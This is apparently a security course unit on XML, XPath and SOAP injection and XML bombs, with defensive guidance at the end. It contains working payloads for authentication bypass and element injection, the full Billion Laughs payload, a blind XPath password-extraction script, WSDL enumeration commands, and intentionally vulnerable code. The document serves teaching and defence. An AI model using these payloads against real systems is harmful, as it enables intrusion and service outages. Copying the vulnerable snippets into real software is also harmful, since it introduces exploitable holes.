# Unit 8: Injection Attacks — Topic 3: XML Injection

## Overview

**XML Injection** encompasses a family of attack techniques that exploit applications which parse, generate, or process **Extensible Markup Language (XML)** data. XML is widely used in web services (SOAP, REST), configuration files, data interchange formats, document standards (DOCX, SVG, XSLT), and enterprise integration. When applications construct XML documents using unsanitized user input, attackers can inject malicious XML content to alter document structure, manipulate application logic, extract data, or cause denial of service.

This topic covers the broad XML injection landscape: **basic XML injection**, **XPath injection**, **XML bombs**, and **SOAP injection**. The closely related **XXE (XML External Entity)** attack is covered in depth in the next topic (04-xxe-attacks.md).

```
+------------------+       +---------------------+       +-------------------+
|    Attacker      | ----> | Web Application     | ----> | XML Parser        |
|  (Injects XML    |       | (Constructs XML     |       | (Processes the    |
|   content)       |       |  from user input)   |       |  malicious XML)   |
+------------------+       +---------------------+       +-------------------+
        |                           |                             |
        |  <user>admin</user>       |  <data>                    |  Parses injected
        |  <role>admin</role>       |    <user>admin</user>      |  structure/content
        |                           |    <role>admin</role>      |  => Logic change
        |                           |    <role>user</role>       |
        |                           |  </data>                   |
        +---------------------------+-----------------------------+
```

---

## 1. XML Structure and Parsing

### 1.1 XML Fundamentals

XML (Extensible Markup Language) is a markup language for encoding documents in a human-readable and machine-readable format. It is a W3C standard used extensively in enterprise applications.

**Basic XML Document Structure:**

```xml
<?xml version="1.0" encoding="UTF-8"?>   <!-- XML Declaration -->
<!DOCTYPE note [                           <!-- Document Type Definition (DTD) -->
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
]>
<note>                                     <!-- Root Element -->
  <to>User</to>                            <!-- Child Elements -->
  <from>Admin</from>
  <heading>Reminder</heading>
  <body>Meeting at 3pm</body>
</note>
```

### 1.2 Key XML Concepts

| Concept            | Description                                                             | Example                                        |
|--------------------|-------------------------------------------------------------------------|------------------------------------------------|
| **Element**        | Building block of XML; has opening and closing tags                     | `<name>John</name>`                            |
| **Attribute**      | Name-value pair within an element's opening tag                         | `<user id="1">`                                |
| **CDATA**          | Character Data section — content not parsed by XML parser               | `<![CDATA[ <not> parsed ]]>`                   |
| **DTD**            | Document Type Definition — defines structure and entities               | `<!DOCTYPE root [ ... ]>`                      |
| **Entity**         | Variable that expands to predefined content                             | `&amp;` → `&`, `&lt;` → `<`                   |
| **Namespace**      | Avoids element name conflicts using URI prefixes                        | `<soap:Envelope xmlns:soap="...">`             |
| **Processing Inst.**| Instructions for the application processing the XML                   | `<?xml-stylesheet type="text/xsl"?>`           |
| **Comment**        | Non-parsed annotation                                                   | `<!-- This is a comment -->`                   |

### 1.3 XML Predefined Entities

| Entity   | Character | Description       |
|----------|-----------|-------------------|
| `&lt;`   | `<`       | Less than         |
| `&gt;`   | `>`       | Greater than      |
| `&amp;`  | `&`       | Ampersand         |
| `&apos;` | `'`       | Apostrophe        |
| `&quot;` | `"`       | Double quote      |

### 1.4 XML Parsers

| Parser Type      | Behavior                                        | Memory Usage | Example Libraries                       |
|------------------|-------------------------------------------------|--------------|------------------------------------------|
| **DOM**          | Loads entire XML into memory as a tree           | High         | `javax.xml.parsers.DocumentBuilder` (Java), `xml.dom` (Python) |
| **SAX**          | Event-driven, reads XML sequentially             | Low          | `javax.xml.parsers.SAXParser` (Java), `xml.sax` (Python) |
| **StAX**         | Pull-based streaming parser                      | Low          | `javax.xml.stream` (Java)               |
| **JAXB**         | Binds XML to Java objects                        | Medium       | `javax.xml.bind` (Java)                 |
| **lxml/etree**   | High-performance XML/HTML parser                 | Medium       | `lxml.etree` (Python)                   |
| **SimpleXML**    | Simple PHP XML parser                            | Medium       | `simplexml_load_string()` (PHP)         |
| **XmlDocument**  | .NET DOM parser                                  | High         | `System.Xml.XmlDocument` (.NET)         |

---

## 2. XML Injection vs XXE

### 2.1 Distinguishing XML Injection and XXE

These two attack categories are often confused. They target different aspects of XML processing:

```
XML Injection                           XXE (XML External Entity)
+-------------------------------+       +-------------------------------+
| Injects XML CONTENT/STRUCTURE |       | Injects XML ENTITY           |
| into existing XML documents   |       | definitions in DOCTYPE        |
|                               |       |                               |
| Targets: Element values,      |       | Targets: DTD/entity           |
| attributes, structure         |       | processing feature            |
|                               |       |                               |
| Goal: Modify logic, add       |       | Goal: File read, SSRF,        |
| elements, change attributes   |       | DoS, RCE                      |
|                               |       |                               |
| Analogy: SQL injection        |       | Analogy: Abusing a built-in   |
| (modifying query structure)   |       | language feature               |
+-------------------------------+       +-------------------------------+
```

| Aspect                | XML Injection                              | XXE                                      |
|-----------------------|--------------------------------------------|------------------------------------------|
| **Attack Surface**    | XML content construction                   | XML entity processing (DTD)              |
| **Injected Content**  | Elements, attributes, CDATA                | Entity declarations, external references |
| **Primary Impact**    | Logic manipulation, data modification      | File disclosure, SSRF, DoS, RCE          |
| **Requires DTD?**     | No                                         | Yes (inline or external DTD)             |
| **Parser Feature**    | Basic XML parsing                          | Entity resolution                        |
| **Covered In**        | This topic (03)                            | Next topic (04)                          |

### 2.2 Basic XML Injection

**Scenario:** An application constructs an XML document from user input for order processing.

**Vulnerable Code (PHP):**
```php
<?php
$username = $_POST['username'];
$email = $_POST['email'];

$xml = "<user><name>" . $username . "</name><email>" . $email . "</email><role>user</role></user>";

$doc = new SimpleXMLElement($xml);
// Process the XML...
?>
```

**Normal Request:**
```
POST /register
username=John&email=john@example.com
```

**Resulting XML:**
```xml
<user>
  <name>John</name>
  <email>john@example.com</email>
  <role>user</role>
</user>
```

**Injected Request:**
```
POST /register
username=John</name><role>admin</role><name>John&email=john@example.com
```

**Resulting XML:**
```xml
<user>
  <name>John</name>
  <role>admin</role>         <!-- INJECTED — may override the real role -->
  <name>John</name>
  <email>john@example.com</email>
  <role>user</role>          <!-- Original role -->
</user>
```

Depending on how the application processes the XML (first-match or last-match for duplicate elements), the attacker may achieve **privilege escalation** by injecting the `<role>admin</role>` element before the legitimate one.

### 2.3 XML Injection Attack Patterns

```
Attack Pattern 1: Element Injection (Privilege Escalation)
+------------------------------------------------------------------+
| Input:  John</name><role>admin</role><name>John                   |
| Effect: Injects <role>admin</role> element                        |
| Impact: Privilege escalation if first-match parsing               |
+------------------------------------------------------------------+

Attack Pattern 2: Attribute Injection
+------------------------------------------------------------------+
| Input:  John" admin="true                                         |
| In:     <user name="John" admin="true" role="user">              |
| Effect: Adds admin="true" attribute                               |
| Impact: Access control bypass                                     |
+------------------------------------------------------------------+

Attack Pattern 3: Comment Injection (Element Removal)
+------------------------------------------------------------------+
| Input:  John</name><!--                                           |
| And:    --><name>John  (in another field)                         |
| Effect: Comments out intermediate elements                        |
| Impact: Removes validation/restriction elements                   |
+------------------------------------------------------------------+

Attack Pattern 4: CDATA Injection
+------------------------------------------------------------------+
| Input:  ]]><script>alert(1)</script><![CDATA[                    |
| Effect: Breaks out of CDATA, injects content                      |
| Impact: XSS if XML is rendered in browser                         |
+------------------------------------------------------------------+
```

### 2.4 XML Injection in API Requests

Many REST and SOAP APIs accept XML input:

```xml
<!-- Normal API Request -->
POST /api/transfer HTTP/1.1
Content-Type: application/xml

<transfer>
  <from>1001</from>
  <to>1002</to>
  <amount>100</amount>
</transfer>
```

**Attack — Inject additional elements:**
```xml
<transfer>
  <from>1001</from>
  <to>1002</to>
  <amount>100</amount>
  <amount>1000000</amount>    <!-- Injected duplicate -->
  <currency>USD</currency>    <!-- Injected new element -->
  <approved>true</approved>   <!-- Injected authorization bypass -->
</transfer>
```

---

## 3. XPath Injection

### 3.1 What is XPath?

**XPath** (XML Path Language) is a query language for selecting nodes from an XML document. It is analogous to SQL for databases — but for XML data. Applications use XPath to search, filter, and extract data from XML documents.

**XPath Expression Syntax:**

| Expression         | Description                                    | Example                           |
|--------------------|------------------------------------------------|-----------------------------------|
| `/`                | Root node                                      | `/bookstore`                      |
| `//`               | Any descendant node                            | `//book`                          |
| `.`                | Current node                                   | `.//title`                        |
| `..`               | Parent node                                    | `../author`                       |
| `@`                | Attribute selector                             | `//book[@lang='en']`              |
| `[]`               | Predicate (filter)                             | `//book[price>30]`                |
| `*`                | Wildcard (any element)                         | `//*`                             |
| `text()`           | Text content of a node                         | `//title/text()`                  |
| `\|`               | Union of results                               | `//book \| //cd`                  |
| `and` / `or`       | Boolean operators                              | `//book[price>10 and price<50]`   |
| `not()`            | Negation                                       | `//book[not(@sold)]`              |
| `contains()`       | String contains                                | `//book[contains(title,'XML')]`   |
| `starts-with()`    | String starts with                             | `//name[starts-with(.,'A')]`      |
| `string-length()`  | Length of a string                              | `//pass[string-length(.)>5]`      |
| `substring()`      | Extract substring                              | `substring(//pass,1,1)`           |
| `count()`          | Count nodes                                    | `count(//user)`                   |

### 3.2 XPath Injection Fundamentals

**Vulnerable Code:**

```php
<?php
// XML data file (users.xml)
// <users>
//   <user><name>admin</name><password>s3cret</password><role>admin</role></user>
//   <user><name>john</name><password>pass123</password><role>user</role></user>
//   <user><name>jane</name><password>jane456</password><role>user</role></user>
// </users>

$xml = simplexml_load_file('users.xml');
$username = $_POST['username'];
$password = $_POST['password'];

// Vulnerable XPath query
$query = "//user[name='" . $username . "' and password='" . $password . "']";
$result = $xml->xpath($query);

if (count($result) > 0) {
    echo "Welcome, " . $result[0]->name . "! Role: " . $result[0]->role;
}
?>
```

**Normal XPath Query:**
```xpath
//user[name='admin' and password='s3cret']
```

### 3.3 XPath Injection Payloads

**Authentication Bypass:**

```
# Always-true condition (like SQL ' OR 1=1 --)
Username: ' or '1'='1
Password: ' or '1'='1
Query:    //user[name='' or '1'='1' and password='' or '1'='1']
Result:   Returns ALL users — login as first user (admin)

# Login as admin without password
Username: admin' or '1'='1
Password: anything' or '1'='1
Query:    //user[name='admin' or '1'='1' and password='anything' or '1'='1']
Result:   Always true — returns all users including admin

# Comment-style bypass (some XPath processors)
Username: admin'or'1'='1
Password: x
Query:    //user[name='admin'or'1'='1' and password='x']
Result:   name='admin' is true via OR
```

```
XPath Injection Flow:

+----------+  user=' or '1'='1  +-----------+  //user[name='' or '1'='1'  +----------+
| Attacker | -----------------> | Web App   | --------------------------> | XML Data |
+----------+                    +-----+-----+  and password='' or         +-----+----+
      ^                               |        '1'='1']                         |
      |                               |                                         |
      |   "Welcome, admin!"           |    Returns all <user> nodes             |
      +-------------------------------+<----------------------------------------+
```

### 3.4 Data Extraction via XPath Injection

**Extracting Node Names and Values:**

```xpath
# Extract total number of users
' or count(//user)>0 or '1'='1    -> TRUE  (at least 1 user)
' or count(//user)>5 or '1'='1    -> FALSE (not more than 5 users)
' or count(//user)=3 or '1'='1    -> TRUE  (exactly 3 users)

# Extract root element name character by character
' or substring(name(/*),1,1)='u' or '1'='1   -> TRUE  (root starts with 'u')
' or substring(name(/*),1,5)='users' or '1'='1 -> TRUE (root is 'users')

# Extract child element names
' or substring(name(//user[1]/*[1]),1,1)='n' or '1'='1  -> TRUE (first child starts with 'n')
' or name(//user[1]/*[1])='name' or '1'='1               -> TRUE (first child is 'name')

# Extract password of specific user
' or substring(//user[name='admin']/password,1,1)='s' or '1'='1  -> TRUE
' or substring(//user[name='admin']/password,1,2)='s3' or '1'='1 -> TRUE
# Continue until full password extracted: s3cret
```

### 3.5 Blind XPath Injection — Complete Extraction

```python
#!/usr/bin/env python3
"""Blind XPath injection data extractor"""

import requests
import string

TARGET = "http://target.com/login"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*"
SUCCESS = "Welcome"

def xpath_blind_test(payload_user, payload_pass="x"):
    """Returns True if XPath query matches."""
    data = {'username': payload_user, 'password': payload_pass}
    r = requests.post(TARGET, data=data)
    return SUCCESS in r.text

def extract_string(xpath_expr, max_len=100):
    """Extract a string value from an XPath expression."""
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char in CHARSET:
            payload = f"' or substring({xpath_expr},{pos},1)='{char}' or '1'='2"
            if xpath_blind_test(payload):
                result += char
                print(f"[+] Position {pos}: {char} -> {result}")
                found = True
                break
        if not found:
            break
    return result

# Extract number of users
for n in range(1, 20):
    if xpath_blind_test(f"' or count(//user)={n} or '1'='2"):
        print(f"[+] Number of users: {n}")
        break

# Extract admin's password
password = extract_string("//user[name='admin']/password")
print(f"[+] Admin password: {password}")

# Extract root element name
root_name = extract_string("name(/*)")
print(f"[+] Root element: {root_name}")
```

### 3.6 XPath vs SQL Injection Comparison

| Feature              | SQL Injection                     | XPath Injection                      |
|----------------------|-----------------------------------|--------------------------------------|
| Data source          | Relational database               | XML document                         |
| Query language       | SQL                               | XPath                                |
| Auth bypass          | `' OR 1=1 --`                     | `' or '1'='1`                        |
| Comment syntax       | `--`, `/**/`, `#`                 | No standard comment in XPath 1.0     |
| Union queries        | `UNION SELECT`                    | `\|` (union operator)               |
| Blind extraction     | `IF(cond, SLEEP(5), 0)`          | `substring()` + boolean oracle       |
| Stacked queries      | `;DROP TABLE`                     | Not applicable                       |
| Write access         | `INSERT`, `UPDATE`, `DELETE`      | XPath is read-only                   |
| Null byte truncation | Sometimes works                   | Depends on implementation            |

---

## 4. XML Bomb (Billion Laughs Attack)

### 4.1 What is an XML Bomb?

The **Billion Laughs Attack** (also called an **XML bomb** or **exponential entity expansion attack**) is a Denial-of-Service (DoS) attack that exploits XML entity expansion to consume all available memory on the XML parser, crashing the application or server.

### 4.2 The Classic Billion Laughs Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 4.3 Expansion Mathematics

```
Expansion Cascade:

Level 0: &lol;   = "lol"                                    =  3 bytes
Level 1: &lol2;  = 10 x &lol;   = 10 x 3                   = 30 bytes
Level 2: &lol3;  = 10 x &lol2;  = 10 x 30                  = 300 bytes
Level 3: &lol4;  = 10 x &lol3;  = 10 x 300                 = 3,000 bytes (3 KB)
Level 4: &lol5;  = 10 x &lol4;  = 10 x 3,000               = 30,000 bytes (30 KB)
Level 5: &lol6;  = 10 x &lol5;  = 10 x 30,000              = 300,000 bytes (300 KB)
Level 6: &lol7;  = 10 x &lol6;  = 10 x 300,000             = 3,000,000 bytes (3 MB)
Level 7: &lol8;  = 10 x &lol7;  = 10 x 3,000,000           = 30,000,000 bytes (30 MB)
Level 8: &lol9;  = 10 x &lol8;  = 10 x 30,000,000          = 300,000,000 bytes (300 MB)

Final:   &lol9; in document = 10^9 x "lol" = ~3 GB of text from <1 KB of input!

+---------------------------------------------------+
| Input Size:   ~1 KB                                |
| Memory Usage: ~3 GB                                |
| Expansion:    ~3,000,000x                          |
| Result:       Out-of-Memory → Application Crash    |
+---------------------------------------------------+
```

### 4.4 Quadratic Blowup Attack

A simpler variant that doesn't use nested entities — just large repeated entity references:

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (50,000 chars)">
]>
<bomb>
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;   <!-- Repeated 50,000 times -->
  <!-- ... -->
  &a;&a;&a;&a;&a;&a;&a;&a;&a;&a;
</bomb>
```

- Entity `&a;` = 50,000 characters
- Referenced 50,000 times = 2.5 GB
- Bypasses some nested entity expansion limits

### 4.5 XML Bomb Variations

| Variant                    | Technique                                  | Bypass Capability                    |
|----------------------------|--------------------------------------------|--------------------------------------|
| Classic Billion Laughs     | Nested entity expansion (10 levels)        | Blocked by most modern parsers       |
| Quadratic Blowup           | Large entity + many references             | May bypass entity depth limits       |
| External Entity DoS        | Entity referencing slow/infinite URL       | Requires external entity processing  |
| Attribute Blowup           | Huge number of attributes on element       | Targets attribute processing         |
| Deep Nesting               | Deeply nested elements (10,000+ levels)    | Targets DOM parsers (stack overflow) |
| Namespace Flood            | Thousands of namespace declarations        | Targets namespace processing         |

---

## 5. SOAP Injection

### 5.1 SOAP Protocol Overview

**SOAP** (Simple Object Access Protocol) is an XML-based messaging protocol for exchanging structured information in web services. It uses XML for message formatting and typically runs over HTTP/HTTPS.

**SOAP Message Structure:**

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <!-- Optional headers (authentication, routing, etc.) -->
    <auth:Token xmlns:auth="http://example.com/auth">
      ABC123
    </auth:Token>
  </soap:Header>
  <soap:Body>
    <!-- Request/Response content -->
    <m:GetPrice xmlns:m="http://example.com/prices">
      <m:Item>Widget</m:Item>
    </m:GetPrice>
  </soap:Body>
</soap:Envelope>
```

### 5.2 SOAP Injection Techniques

**Vulnerable SOAP Client Code:**

```python
def get_price(item_name):
    # User input directly concatenated into SOAP XML
    soap_request = f"""<?xml version="1.0"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <m:GetPrice xmlns:m="http://example.com/prices">
          <m:Item>{item_name}</m:Item>
        </m:GetPrice>
      </soap:Body>
    </soap:Envelope>"""
    
    response = requests.post(SOAP_ENDPOINT, data=soap_request,
                            headers={'Content-Type': 'text/xml'})
    return response.text
```

**Attack — Inject additional SOAP elements:**

```
Normal input:  Widget
Injected input: Widget</m:Item><m:Price>0.01</m:Price><m:Item>Widget

Resulting SOAP:
<m:GetPrice xmlns:m="http://example.com/prices">
  <m:Item>Widget</m:Item>
  <m:Price>0.01</m:Price>              <!-- Injected! -->
  <m:Item>Widget</m:Item>              <!-- Injected! -->
</m:GetPrice>
```

### 5.3 SOAP Injection Attack Scenarios

```
Scenario 1: Price Manipulation
+------------------------------------------------------------------+
| Input:  Widget</m:Item><m:Quantity>1000</m:Quantity>              |
|         <m:Price>0.01</m:Price><m:Item>X                         |
| Effect: Overrides price/quantity in the SOAP message              |
+------------------------------------------------------------------+

Scenario 2: Authentication Bypass (Header Injection)
+------------------------------------------------------------------+
| Input:  Widget</m:Item></m:GetPrice></soap:Body></soap:Envelope> |
|         <?xml version="1.0"?>                                    |
|         <soap:Envelope ...>                                      |
|           <soap:Header>                                          |
|             <auth:Token>ADMIN_TOKEN</auth:Token>                 |
|           </soap:Header>                                         |
|           <soap:Body><m:GetPrice><m:Item>Widget                  |
| Effect: Injects an entirely new SOAP envelope with admin auth    |
+------------------------------------------------------------------+

Scenario 3: Method Switching
+------------------------------------------------------------------+
| Input:  Widget</m:Item></m:GetPrice>                             |
|         <m:DeleteItem><m:Item>CriticalProduct</m:Item>           |
|         </m:DeleteItem><m:GetPrice><m:Item>Widget                |
| Effect: Injects a DeleteItem operation                           |
+------------------------------------------------------------------+
```

### 5.4 WSDL Enumeration for SOAP Attacks

Before attacking SOAP services, enumerate the **WSDL** (Web Services Description Language) to understand available operations:

```bash
# Retrieve WSDL
curl http://target.com/service?wsdl
curl http://target.com/service.asmx?wsdl

# Tools for WSDL analysis
# SoapUI — GUI tool for testing SOAP/REST services
# wsdler — Burp Suite extension for WSDL parsing

# Nmap SOAP enumeration
nmap -sV -p 80,443,8080 --script http-wsdl-detect target.com
```

### 5.5 SOAP Injection Detection

```
+------------------------------+
| 1. Identify SOAP endpoints   |
|    (Look for /ws, /service,  |
|     /soap, ?wsdl)            |
+-------------+----------------+
              |
              v
+-------------+----------------+
| 2. Capture SOAP requests     |
|    (Burp Suite proxy)        |
+-------------+----------------+
              |
              v
+-------------+----------------+
| 3. Inject XML metacharacters |
|    into parameter values:    |
|    < > " ' & / ; ]]>        |
+-------------+----------------+
              |
    +---------+---------+
    |                   |
    v                   v
+---+--------+  +-------+------+
| XML Error  |  | No Error     |
| Returned   |  | (may be safe |
+------------+  |  or silent)  |
| Injection  |  +--------------+
| confirmed  |
+-----+------+
      |
      v
+-----+-------------------+
| 4. Craft structural     |
|    injection payloads   |
|    (close tags, inject  |
|     new elements)       |
+-------------------------+
```

---

## 6. Prevention Techniques

### 6.1 XML Injection Prevention

| Prevention Technique              | Description                                                      | Effectiveness |
|-----------------------------------|------------------------------------------------------------------|---------------|
| **Input validation**              | Allowlist acceptable characters; reject XML metacharacters        | ★★★★☆         |
| **Output encoding**               | Encode `<`, `>`, `&`, `'`, `"` before inserting into XML         | ★★★★★         |
| **Use XML libraries**             | Build XML with DOM/library APIs, not string concatenation         | ★★★★★         |
| **Schema validation**             | Validate XML against XSD schema before processing                | ★★★★☆         |
| **Disable DTD processing**        | Prevents entity-based attacks (XXE, bombs)                       | ★★★★★         |
| **Limit entity expansion**        | Set maximum entity expansion limits                              | ★★★★☆         |
| **Use JSON instead**              | Where possible, prefer JSON over XML                             | ★★★★★         |

### 6.2 Secure XML Construction

**Bad — String Concatenation:**
```python
# VULNERABLE
xml = f"<user><name>{username}</name><role>user</role></user>"
```

**Good — Using XML Library (Python):**
```python
import xml.etree.ElementTree as ET

# SAFE — Library handles escaping automatically
user = ET.Element("user")
name = ET.SubElement(user, "name")
name.text = username  # Automatically escapes < > & ' "
role = ET.SubElement(user, "role")
role.text = "user"
xml_string = ET.tostring(user, encoding="unicode")
```

**Good — Using XML Library (Java):**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.newDocument();

Element user = doc.createElement("user");
doc.appendChild(user);

Element name = doc.createElement("name");
name.setTextContent(username);  // Automatically escapes special characters
user.appendChild(name);

Element role = doc.createElement("role");
role.setTextContent("user");
user.appendChild(role);
```

**Good — Using XML Library (PHP):**
```php
<?php
$doc = new DOMDocument('1.0', 'UTF-8');
$user = $doc->createElement('user');
$doc->appendChild($user);

$name = $doc->createElement('name');
$name->appendChild($doc->createTextNode($username)); // Escapes automatically
$user->appendChild($name);

$role = $doc->createElement('role');
$role->appendChild($doc->createTextNode('user'));
$user->appendChild($role);

$xml = $doc->saveXML();
?>
```

### 6.3 XPath Injection Prevention

**Use Parameterized XPath Queries:**

```java
// Java — Parameterized XPath with XPathVariableResolver
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();

// Set variables safely
xpath.setXPathVariableResolver(new XPathVariableResolver() {
    public Object resolveVariable(QName variableName) {
        if (variableName.getLocalPart().equals("username")) return username;
        if (variableName.getLocalPart().equals("password")) return password;
        return null;
    }
});

// Parameterized query — variables are safely bound
String expr = "//user[name=$username and password=$password]";
XPathExpression xpathExpr = xpath.compile(expr);
NodeList result = (NodeList) xpathExpr.evaluate(doc, XPathConstants.NODESET);
```

**Input Validation for XPath:**
```python
import re

def sanitize_xpath_input(value):
    """Remove XPath special characters."""
    # Allowlist: alphanumeric + spaces + basic punctuation
    if not re.match(r'^[a-zA-Z0-9@._\- ]+$', value):
        raise ValueError("Invalid input characters")
    return value
```

### 6.4 XML Bomb Prevention

```python
# Python — Using defusedxml (safe XML parsing)
import defusedxml.ElementTree as ET

# Automatically prevents:
# - Entity expansion attacks (Billion Laughs)
# - External entity processing (XXE)
# - DTD processing
tree = ET.parse('data.xml')  # Safe!
```

```java
// Java — Disable DTD and entity expansion
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputSource);
```

```php
<?php
// PHP — Disable entity loading
libxml_disable_entity_loader(true);  // Deprecated in PHP 8.0+ (disabled by default)

// Set entity expansion limit
// In php.ini: libxml.entity_expansion_limit = 100
?>
```

### 6.5 Defense-in-Depth Summary

```
+------------------------------------------------------------------------+
|                    XML Security Defense Layers                           |
|                                                                         |
|  Layer 1: Use XML libraries (not string concatenation) to build XML     |
|  Layer 2: Validate input against allowlist of expected characters        |
|  Layer 3: Disable DTD processing and external entities                  |
|  Layer 4: Set entity expansion limits                                   |
|  Layer 5: Validate XML against XSD schema                               |
|  Layer 6: Use parameterized XPath queries                               |
|  Layer 7: Use defusedxml / safe parser configurations                   |
|  Layer 8: Consider JSON as alternative to XML                           |
+------------------------------------------------------------------------+
```

---

## Summary Table

| Concept                  | Key Points                                                                                   |
|--------------------------|----------------------------------------------------------------------------------------------|
| **XML Injection**        | Injecting XML elements/attributes via unsanitized input to alter document structure           |
| **XPath Injection**      | Manipulating XPath queries (analogous to SQL injection for XML data stores)                   |
| **XML Bomb**             | Billion Laughs — exponential entity expansion causing DoS (1 KB → 3 GB)                      |
| **SOAP Injection**       | Injecting malicious XML into SOAP messages to manipulate web service operations               |
| **XML vs XXE**           | XML injection modifies content/structure; XXE exploits entity resolution for file read/SSRF   |
| **Key Metacharacters**   | `<`, `>`, `&`, `'`, `"` — must be encoded when inserting user data into XML                  |
| **Prevention**           | Use XML libraries, disable DTDs, parameterize XPath, validate schemas, use defusedxml        |

---

## Revision Questions

1. **Explain how an XML injection attack differs from an XXE (XML External Entity) attack. What part of the XML specification does each exploit, and what are their typical impacts?**

2. **A web application uses XPath to query an XML user database with the query `//user[name='INPUT' and password='INPUT']`. Demonstrate an XPath injection payload to bypass authentication, and explain why it works by analyzing the resulting query.**

3. **Describe the Billion Laughs (XML Bomb) attack. Calculate the approximate memory consumption for a 9-level nested entity expansion where each level references the previous entity 10 times, and the base entity is 3 bytes. What parser configurations prevent this attack?**

4. **A SOAP web service accepts user input in the `<Item>` element. Demonstrate how an attacker could inject additional SOAP elements to manipulate the transaction (e.g., changing price or quantity). What is the key vulnerability in how the SOAP message is constructed?**

5. **Compare XPath injection with SQL injection across the following dimensions: query language syntax, authentication bypass techniques, data extraction methods, and available defenses. Which attack type is generally more dangerous and why?**

---

*Previous: [02-ldap-injection.md](02-ldap-injection.md) | Next: [04-xxe-attacks.md](04-xxe-attacks.md)*

---

*[Back to README](../README.md)*
